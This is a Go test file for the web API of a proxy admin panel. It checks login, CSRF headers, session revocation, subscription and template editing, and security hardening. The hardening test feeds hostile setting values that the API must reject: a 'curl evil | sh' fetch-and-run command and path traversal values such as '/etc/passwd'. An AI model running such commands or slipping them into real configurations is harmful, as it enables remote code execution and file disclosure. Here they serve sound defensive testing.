package webapi

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"testing/fstest"
	"time"

	"github.com/vyto4ka/vynel/internal/panel/service"
	"github.com/vyto4ka/vynel/internal/panel/store"
)

type client struct {
	t      *testing.T
	srv    *Server
	lang   string // sent as X-Lang when set
	addr   string // overrides r.RemoteAddr when set
	base   string
	cookie *http.Cookie
}

func (c *client) do(method, path, body string, csrf bool) *httptest.ResponseRecorder {
	r := httptest.NewRequest(method, c.base+path, strings.NewReader(body))
	if c.addr != "" {
		r.RemoteAddr = c.addr
	}
	if csrf {
		r.Header.Set(csrfHeader, "1")
	}
	if c.lang != "" {
		r.Header.Set("X-Lang", c.lang)
	}
	if c.cookie != nil {
		r.AddCookie(c.cookie)
	}
	w := httptest.NewRecorder()
	c.srv.ServeHTTP(w, r)
	for _, ck := range w.Result().Cookies() {
		if ck.Name == cookieName {
			c.cookie = ck
		}
	}
	return w
}

func newServer(t *testing.T) (*client, *service.Service, string) {
	ctx := context.Background()
	st, err := store.Open(ctx, ":memory:")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	svc := service.New(st)
	if err := svc.EnsureDefaults(ctx); err != nil {
		t.Fatal(err)
	}
	if err := svc.EnsureWebDefaults(ctx); err != nil {
		t.Fatal(err)
	}
	pw, err := svc.SetAdminCredentials(ctx, service.ActorCLI, "boss")
	if err != nil {
		t.Fatal(err)
	}
	base, _ := svc.WebPath(ctx)
	ui := fstest.MapFS{"index.html": {Data: []byte("<html>app</html>")}, "assets/a.js": {Data: []byte("js")}}
	srv := New(Config{Service: svc, UI: ui, Version: "test"})
	return &client{t: t, srv: srv, base: strings.TrimSuffix(base, "/")}, svc, pw
}

func TestLoginAndAPI(t *testing.T) {
	c, _, pw := newServer(t)

	// Outside the secret path: plain 404, nothing about the panel.
	r := httptest.NewRequest("GET", "/", nil)
	w := httptest.NewRecorder()
	c.srv.ServeHTTP(w, r)
	if w.Code != 404 || strings.Contains(w.Body.String(), "app") {
		t.Fatalf("root: %d %q", w.Code, w.Body.String())
	}
	if w := c.do("GET", "/", "", false); w.Code != 200 || !strings.Contains(w.Body.String(), "app") {
		t.Fatalf("ui: %d", w.Code)
	}
	if w := c.do("GET", "/api/users", "", false); w.Code != 401 {
		t.Fatalf("unauthenticated: %d", w.Code)
	}
	if w := c.do("POST", "/api/login", `{"login":"boss","password":"nope"}`, true); w.Code != 401 {
		t.Fatalf("bad password: %d", w.Code)
	}
	if w := c.do("POST", "/api/login", `{"login":"boss","password":"`+pw+`"}`, false); w.Code != 403 {
		t.Fatalf("login without csrf header: %d", w.Code)
	}
	if w := c.do("POST", "/api/login", `{"login":"boss","password":"`+pw+`"}`, true); w.Code != 200 || c.cookie == nil {
		t.Fatalf("login: %d %s", w.Code, w.Body.String())
	}
	if !c.cookie.HttpOnly || c.cookie.Path != c.base+"/" {
		t.Fatalf("cookie: %+v", c.cookie)
	}

	if w := c.do("POST", "/api/users", `{"username":"vasya"}`, false); w.Code != 403 {
		t.Fatalf("mutation without csrf header: %d", w.Code)
	}
	w = c.do("POST", "/api/users", `{"username":"vasya"}`, true)
	if w.Code != 200 {
		t.Fatalf("create user: %d %s", w.Code, w.Body.String())
	}
	var u User
	_ = json.Unmarshal(w.Body.Bytes(), &u)
	if u.Username != "vasya" || u.Status != store.StatusActive {
		t.Fatalf("user: %+v", u)
	}
	if w := c.do("POST", "/api/users", `{"username":"vasya"}`, true); w.Code != 409 {
		t.Fatalf("duplicate: %d", w.Code)
	}
	if w := c.do("PATCH", "/api/users/"+itoa(u.ID), `{"enabled":false,"note":"x"}`, true); w.Code != 200 || !strings.Contains(w.Body.String(), `"status":"disabled"`) {
		t.Fatalf("disable: %d %s", w.Code, w.Body.String())
	}
	if w := c.do("POST", "/api/users/"+itoa(u.ID)+"/extend", `{"months":1}`, true); w.Code != 200 {
		t.Fatalf("extend: %d %s", w.Code, w.Body.String())
	}
	for _, p := range []string{"/api/overview", "/api/users/" + itoa(u.ID), "/api/groups", "/api/templates", "/api/nodes", "/api/profiles",
		"/api/profile-templates", "/api/settings", "/api/audit", "/api/session"} {
		if w := c.do("GET", p, "", false); w.Code != 200 {
			t.Fatalf("%s: %d %s", p, w.Code, w.Body.String())
		}
	}
	if w := c.do("GET", "/api/settings", "", false); strings.Contains(w.Body.String(), "password_hash") || strings.Contains(w.Body.String(), "session_key") {
		t.Fatal("secret settings leaked")
	}
	if w := c.do("PUT", "/api/settings", `{"key":"web.password_hash","value":"x"}`, true); w.Code != 400 {
		t.Fatalf("secret setting write: %d", w.Code)
	}

	// Changing the password logs out other sessions but keeps this one.
	old := c.cookie
	w = c.do("POST", "/api/account", `{"current":"`+pw+`","generate":true}`, true)
	if w.Code != 200 {
		t.Fatalf("account: %d %s", w.Code, w.Body.String())
	}
	if w := c.do("GET", "/api/session", "", false); w.Code != 200 {
		t.Fatalf("session after password change: %d", w.Code)
	}
	c.cookie = old
	if w := c.do("GET", "/api/session", "", false); w.Code != 401 {
		t.Fatalf("old session still valid: %d", w.Code)
	}
}

func itoa(i int64) string { return strconv.FormatInt(i, 10) }

func TestSubscriptionAPI(t *testing.T) {
	c, _, pw := newServer(t)
	if w := c.do("POST", "/api/login", `{"login":"boss","password":"`+pw+`"}`, true); w.Code != 200 {
		t.Fatal("login")
	}
	w := c.do("GET", "/api/subscription", "", false)
	if w.Code != 200 || !strings.Contains(w.Body.String(), `"keqdroid"`) || !strings.Contains(w.Body.String(), "Subscription-Userinfo") {
		t.Fatalf("config: %d %.200s", w.Code, w.Body.String())
	}
	body := `{"basics":{"title":"Мику","updateHours":3},"headers":[{"name":"Hide-Settings","value":"1","clients":"(?i)happ","enabled":true},{"name":"Profile-Title","value":"{title}","base64":true,"enabled":true}]}`
	if w := c.do("PUT", "/api/subscription", body, true); w.Code != 200 {
		t.Fatalf("save: %d %s", w.Code, w.Body.String())
	}
	w = c.do("POST", "/api/subscription/test", `{"userAgent":"Happ/4.1.0"}`, true)
	if w.Code != 200 || !strings.Contains(w.Body.String(), `"Hide-Settings"`) || !strings.Contains(w.Body.String(), `"format":"base64"`) {
		t.Fatalf("test: %d %s", w.Code, w.Body.String())
	}
	// A routing draft must be visible before saving, even with an old saved header list.
	w = c.do("POST", "/api/subscription/test", `{"userAgent":"Happ/4.1.0","routing":{"ruDirect":false,"proxy":["domain:draft.example.org"]}}`, true)
	var preview struct {
		Headers []struct{ Name, Value string }
	}
	if err := json.Unmarshal(w.Body.Bytes(), &preview); err != nil || w.Code != 200 {
		t.Fatalf("routing preview: %d %s", w.Code, w.Body.String())
	}
	found := false
	for _, h := range preview.Headers {
		if h.Name == "Routing" {
			payload := strings.SplitN(h.Value, "/onadd/", 2)
			if len(payload) != 2 {
				t.Fatal("invalid Routing link")
			}
			raw, err := base64.StdEncoding.DecodeString(payload[1])
			if err != nil || !strings.Contains(string(raw), "domain:draft.example.org") || strings.Contains(string(raw), "geoip:ru") {
				t.Fatalf("preview lost routing draft: %s %v", raw, err)
			}
			found = true
		}
	}
	if !found {
		t.Fatal("automatic Routing missing from preview")
	}
	w = c.do("POST", "/api/subscription/test", `{"userAgent":"clash-verge/2","hwid":"preview-device"}`, true)
	if strings.Contains(w.Body.String(), `"Hide-Settings"`) || !strings.Contains(w.Body.String(), `"format":"mihomo"`) {
		t.Fatalf("clash test: %s", w.Body.String())
	}
	if w := c.do("PUT", "/api/subscription", `{"headers":[{"name":"Content-Type","value":"x","enabled":true}]}`, true); w.Code != 400 {
		t.Fatalf("reserved header accepted: %d", w.Code)
	}
	// An error names the tab, the field and the line; nothing of the draft is saved then.
	bad := `{"basics":{"title":"Другое","updateHours":5},"routing":{"ruDirect":true,"dnsDirect":["localhost"],"dnsProxy":[],"torrent":"direct",` +
		`"direct":["geosite:epicgames","","process:C:\\Games\\x.exe"],"proxy":[],"block":[]}}`
	w = c.do("PUT", "/api/subscription", bad, true)
	if w.Code != 400 || !strings.Contains(w.Body.String(), `«Маршруты», «Всегда напрямую», строка 3: \"process:C:\\\\Games\\\\x.exe\" — после process:`) {
		t.Fatalf("routing error: %d %s", w.Code, w.Body.String())
	}
	if w := c.do("GET", "/api/subscription", "", false); !strings.Contains(w.Body.String(), `"title":"Мику"`) {
		t.Fatalf("a failed save changed another tab: %.300s", w.Body.String())
	}
	w = c.do("PUT", "/api/subscription", `{"rules":[{"pattern":"happ","format":"base64","enabled":true},{"pattern":"(x","format":"xray","enabled":true}]}`, true)
	if w.Code != 400 || !strings.Contains(w.Body.String(), "«Форматы», строка 2, User-Agent") {
		t.Fatalf("rules error: %d %s", w.Code, w.Body.String())
	}
	w = c.do("GET", "/api/subscription/preview", "", false)
	if w.Code != 200 || !strings.Contains(w.Body.String(), "Мику") || strings.Contains(w.Body.String(), "Предпросмотр") || !strings.Contains(w.Body.String(), `href="happ://add/https://example.com/s/demo-token" target="_blank"`) || !strings.Contains(w.Body.String(), `src="preview.js"`) || !strings.Contains(w.Header().Get("Content-Security-Policy"), "script-src 'self'") || w.Header().Get("X-Frame-Options") != "SAMEORIGIN" {
		t.Fatalf("preview: %d %q %.100s", w.Code, w.Header().Get("X-Frame-Options"), w.Body.String())
	}
	w = c.do("GET", "/api/subscription/preview.js", "", false)
	if w.Code != 200 || !strings.Contains(w.Header().Get("Content-Type"), "javascript") || !strings.Contains(w.Body.String(), "copyValue") {
		t.Fatalf("preview.js: %d %q", w.Code, w.Header().Get("Content-Type"))
	}
	w = c.do("GET", "/api/subscription/preview?lang=en", "", false)
	if w.Code != 200 || !strings.Contains(w.Body.String(), `<html lang="en"`) || !strings.Contains(w.Body.String(), "Connect") {
		t.Fatalf("preview en: %d %.120s", w.Code, w.Body.String())
	}
	w = c.do("GET", "/api/subscription/preview?open=1", "", false)
	if w.Code != 302 || w.Header().Get("Location") != "https://example.com/s/demo-token" {
		t.Fatalf("preview open: %d %q", w.Code, w.Header().Get("Location"))
	}
	if w := c.do("POST", "/api/subscription/reset", `{"part":"headers"}`, true); w.Code != 200 || !strings.Contains(w.Body.String(), "Subscription-Userinfo") {
		t.Fatalf("reset: %d", w.Code)
	}
}

func TestTemplateEditorAPI(t *testing.T) {
	c, _, pw := newServer(t)
	if w := c.do("POST", "/api/login", `{"login":"boss","password":"`+pw+`"}`, true); w.Code != 200 {
		t.Fatal("login")
	}
	w := c.do("GET", "/api/profile-templates", "", false)
	if w.Code != 200 || !strings.Contains(w.Body.String(), `"source":"`) {
		t.Fatalf("list: %d", w.Code)
	}
	var list []struct {
		ID     string `json:"id"`
		Source string `json:"source"`
	}
	_ = json.Unmarshal(w.Body.Bytes(), &list)
	src := strings.Replace(list[0].Source, "id: "+list[0].ID, "id: mine", 1)
	body, _ := json.Marshal(map[string]string{"source": src})
	if w := c.do("POST", "/api/profile-templates/check", string(body), true); !strings.Contains(w.Body.String(), `"ok":true`) || strings.Contains(w.Body.String(), "PRIVATE_KEY\":\"") {
		t.Fatalf("check: %s", w.Body.String())
	}
	bad, _ := json.Marshal(map[string]string{"source": "id: x\nxray_inbound: '{'"})
	if w := c.do("POST", "/api/profile-templates/check", string(bad), true); !strings.Contains(w.Body.String(), `"ok":false`) {
		t.Fatalf("bad check: %s", w.Body.String())
	}
	// Live preview: the inbound and the host section with sample values, secrets masked.
	if w := c.do("POST", "/api/profile-templates/preview", string(body), true); w.Code != 200 ||
		!strings.Contains(w.Body.String(), `"ok":true`) || !strings.Contains(w.Body.String(), `"host"`) ||
		strings.Contains(w.Body.String(), "PRIVATE_KEY\":\"") || strings.Contains(w.Body.String(), `${`) {
		t.Fatalf("preview: %d %s", w.Code, w.Body.String())
	}
	// A draft with an unresolved ${VAR} still previews; the name is reported.
	draftSrc := strings.Replace(list[0].Source, "id: "+list[0].ID, "id: draft", 1)
	draft, _ := json.Marshal(map[string]string{"source": strings.Replace(draftSrc, `"${TAG}"`, `"${TAGX}"`, 1)})
	if w := c.do("POST", "/api/profile-templates/preview", string(draft), true); !strings.Contains(w.Body.String(), `"ok":true`) ||
		!strings.Contains(w.Body.String(), `"unresolved":["TAGX"]`) {
		t.Fatalf("draft preview: %s", w.Body.String())
	}
	if w := c.do("POST", "/api/profile-templates/preview", string(bad), true); !strings.Contains(w.Body.String(), `"ok":false`) {
		t.Fatalf("bad preview: %s", w.Body.String())
	}
	if w := c.do("POST", "/api/profile-templates", string(body), true); w.Code != 200 {
		t.Fatalf("save: %d %s", w.Code, w.Body.String())
	}
	if w := c.do("POST", "/api/profiles", `{"name":"P","templateId":"mine"}`, true); w.Code != 200 {
		t.Fatalf("profile on custom template: %d %s", w.Code, w.Body.String())
	}
	if w := c.do("DELETE", "/api/profile-templates/mine", "", true); w.Code != 400 {
		t.Fatalf("deleted a template in use: %d", w.Code)
	}
	w = c.do("POST", "/api/profiles/1/preview", `{"override":{"sniffing":{"enabled":false}}}`, true)
	if w.Code != 200 || !strings.Contains(w.Body.String(), `"inbounds":[]`) {
		t.Fatalf("preview: %d %s", w.Code, w.Body.String())
	}
	if w := c.do("GET", "/api/profiles/1", "", false); w.Code != 200 || !strings.Contains(w.Body.String(), `"templateId":"mine"`) {
		t.Fatalf("profile: %d %s", w.Code, w.Body.String())
	}
}

func TestMagicLogin(t *testing.T) {
	c, svc, _ := newServer(t)
	ctx := context.Background()
	tok, _, err := svc.CreateLoginToken(ctx, service.Actor{Kind: "bot", ID: "42"}, "")
	if err != nil {
		t.Fatal(err)
	}
	body := `{"token":"` + tok + `"}`
	if w := c.do("POST", "/api/login/magic", body, false); w.Code != 403 {
		t.Fatalf("without csrf header: %d", w.Code)
	}
	if w := c.do("POST", "/api/login/magic", body, true); w.Code != 200 || c.cookie == nil {
		t.Fatalf("magic login: %d %s", w.Code, w.Body.String())
	}
	if w := c.do("GET", "/api/session", "", false); w.Code != 200 || !strings.Contains(w.Body.String(), `"login":"boss"`) {
		t.Fatalf("session after magic login: %d %s", w.Code, w.Body.String())
	}
	c.cookie = nil
	if w := c.do("POST", "/api/login/magic", body, true); w.Code != 401 {
		t.Fatalf("token used twice: %d", w.Code)
	}
	// Expired.
	now := time.Now()
	svc.SetClock(func() time.Time { return now.Add(-2 * time.Minute) })
	old, _, _ := svc.CreateLoginToken(ctx, service.Actor{Kind: "bot", ID: "42"}, "")
	svc.SetClock(time.Now)
	if w := c.do("POST", "/api/login/magic", `{"token":"`+old+`"}`, true); w.Code != 401 {
		t.Fatalf("expired token accepted: %d", w.Code)
	}
}

func TestSubPrefixSetting(t *testing.T) {
	c, svc, pw := newServer(t)
	if w := c.do("POST", "/api/login", `{"login":"boss","password":"`+pw+`"}`, true); w.Code != 200 {
		t.Fatal("login")
	}
	// Empty means the domain root: https://sub.example.com/<token> (the Remnawave layout).
	if w := c.do("PUT", "/api/settings", `{"key":"sub.prefix","value":""}`, true); w.Code != 200 {
		t.Fatalf("empty prefix: %d %s", w.Code, w.Body.String())
	}
	if p := svc.SubPrefix(context.Background()); p != "/" {
		t.Fatalf("SubPrefix %q", p)
	}
	// A word becomes a "/word/" prefix, slashes trimmed.
	if w := c.do("PUT", "/api/settings", `{"key":"sub.prefix","value":"/api/v1/"}`, true); w.Code != 200 {
		t.Fatalf("word prefix: %d %s", w.Code, w.Body.String())
	}
	if p := svc.SubPrefix(context.Background()); p != "/api/v1/" {
		t.Fatalf("SubPrefix %q", p)
	}
	// Invalid characters are still rejected and change nothing.
	if w := c.do("PUT", "/api/settings", `{"key":"sub.prefix","value":"a?b"}`, true); w.Code != 400 {
		t.Fatalf("bad prefix: %d", w.Code)
	}
	if p := svc.SubPrefix(context.Background()); p != "/api/v1/" {
		t.Fatalf("rejected value changed the prefix: %q", p)
	}
}

func TestSecurityHardeningWebAPI(t *testing.T) {
	c, svc, pw := newServer(t)
	if w := c.do("POST", "/api/login", `{"login":"boss","password":"`+pw+`"}`, true); w.Code != 200 {
		t.Fatal("login")
	}

	// Hidden and unknown internal settings cannot be overwritten via PUT /api/settings.
	for _, body := range []string{
		`{"key":"install.command","value":"curl evil | sh"}`,
		`{"key":"bot.admins","value":"[1]"}`,
		`{"key":"sub.headers","value":"[]"}`,
		`{"key":"web.login_mode","value":"miniapp"}`,
		`{"key":"unknown.internal","value":"x"}`,
		`{"key":"decoy.seed","value":"deadbeef"}`,
		`{"key":"web.decoy","value":"../../etc"}`,
		`{"key":"web.decoy_path","value":"/etc/passwd"}`,
		`{"key":"sub.decoy_path","value":"/nonexistent/path/index.html"}`,
		`{"key":"web.domain","value":"evil.example/path#frag"}`,
	} {
		if w := c.do("PUT", "/api/settings", body, true); w.Code != 400 {
			t.Fatalf("accepted unsafe setting %s: %d %s", body, w.Code, w.Body.String())
		}
	}

	// Custom HTML decoy path accepts an existing HTML file and can be cleared.
	customHTML := filepath.Join(t.TempDir(), "custom.html")
	if err := os.WriteFile(customHTML, []byte("<!doctype html><h1>Own</h1>"), 0o644); err != nil {
		t.Fatal(err)
	}
	payload, _ := json.Marshal(map[string]string{"key": "web.decoy_path", "value": customHTML})
	if w := c.do("PUT", "/api/settings", string(payload), true); w.Code != 200 {
		t.Fatalf("valid web.decoy_path rejected: %d %s", w.Code, w.Body.String())
	}
	if w := c.do("PUT", "/api/settings", `{"key":"web.decoy_path","value":""}`, true); w.Code != 200 {
		t.Fatalf("clearing web.decoy_path rejected: %d %s", w.Code, w.Body.String())
	}

	// POST /api/logout requires X-Vynel: 1 (CSRF protection across sibling subdomains).
	if w := c.do("POST", "/api/logout", "{}", false); w.Code != 403 {
		t.Fatalf("logout without X-Vynel: got %d, want 403", w.Code)
	}
	if w := c.do("GET", "/api/session", "", false); w.Code != 200 {
		t.Fatalf("session ended by unauthenticated logout: %d", w.Code)
	}

	// Second browser session is revoked in web_sessions when password changes.
	other := &client{srv: c.srv, base: c.base, addr: "198.51.100.42:5000"}
	if w := other.do("POST", "/api/login", `{"login":"boss","password":"`+pw+`"}`, true); w.Code != 200 {
		t.Fatal("other login")
	}
	if len(svc.WebSessionIPs(context.Background())) < 2 {
		t.Fatalf("expected 2 active session IPs, got %v", svc.WebSessionIPs(context.Background()))
	}
	if w := c.do("POST", "/api/account", `{"current":"`+pw+`","password":"NewPassword123!"}`, true); w.Code != 200 {
		t.Fatalf("account password change: %d %s", w.Code, w.Body.String())
	}
	if ips := svc.WebSessionIPs(context.Background()); len(ips) != 1 {
		t.Fatalf("other session IP stayed in firewall allowlist after password change: %v", ips)
	}

	// Telegram Mini App initData cannot be replayed a second time.
	bindAdmin(t, svc, 4242)
	signed := initData(testBotToken, 4242, time.Now())
	tgBody, _ := json.Marshal(map[string]string{"initData": signed})
	tgClient := &client{srv: c.srv, base: c.base, addr: "203.0.113.77:5000"}
	if w := tgClient.do("POST", "/api/login/telegram", string(tgBody), true); w.Code != 200 {
		t.Fatalf("first telegram login: %d %s", w.Code, w.Body.String())
	}
	replayClient := &client{srv: c.srv, base: c.base, addr: "203.0.113.88:5000"}
	if w := replayClient.do("POST", "/api/login/telegram", string(tgBody), true); w.Code != 401 {
		t.Fatalf("replayed telegram initData accepted: %d %s", w.Code, w.Body.String())
	}
}
